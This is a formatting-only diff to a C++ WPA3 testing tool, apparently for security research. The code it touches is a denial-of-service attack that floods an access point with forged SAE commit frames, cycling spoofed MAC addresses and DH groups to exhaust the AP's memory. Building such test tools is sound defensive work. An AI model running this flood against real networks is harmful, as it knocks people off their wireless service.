@@ -19,7 +19,7 @@ using namespace chrono;
 
 namespace wpa3_tester::memory_omnivore{
 static constexpr uint16_t DH_GROUPS[] = {19, 20, 21};
-static constexpr size_t N_DH_GROUPS = std::size(DH_GROUPS);
+static constexpr size_t N_DH_GROUPS = size(DH_GROUPS);
 
 static vector<HWAddress<6>> build_mac_pool(RunStatus &rs, const int pool_size, const bool use_connected_stas){
 	vector<HWAddress<6>> pool;
@@ -49,9 +49,9 @@ void run_attack(RunStatus &rs){
 
 	// Capture real scalar+element via wpa_supplicant before switching to monitor
 	log(LogLevel::INFO, "Capturing SAE commit values...");
-	const optional<sae_helper::SAEPair> sae_params =
-		cookie_guzzler::get_commit_values(rs, attacker.get(SK::iface), attacker.get(SK::sniff_iface),
-			hostapd::get_ssid(rs, "access_point"), ap.get(SK::mac), 30);
+	const optional<sae_helper::SAEPair> sae_params = cookie_guzzler::get_commit_values(
+		rs, attacker.get(SK::iface), attacker.get(SK::sniff_iface), hostapd::get_ssid(rs, "access_point"),
+		ap.get(SK::mac), 30);
 
 	if(!sae_params.has_value()) throw run_err("Failed to capture SAE commit values");
 
@@ -81,12 +81,12 @@ void run_attack(RunStatus &rs){
 
 	size_t mac_idx = 0;
 	dos_helpers::timed_burst(sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL,
-	[&]() -> optional<RadioTap>{
-		const auto &sta_mac = mac_pool[mac_idx % mac_pool.size()];
-		++mac_idx;
-		sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
-		return make_sae_commit(ap.get(SK::mac), sta_mac, sae_params.value());
-	});
+							[&]() ->optional<RadioTap>{
+								const auto &sta_mac = mac_pool[mac_idx % mac_pool.size()];
+								++mac_idx;
+								sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
+								return make_sae_commit(ap.get(SK::mac), sta_mac, sae_params.value());
+							});
 
 	ap->conn->disconnect();
 }
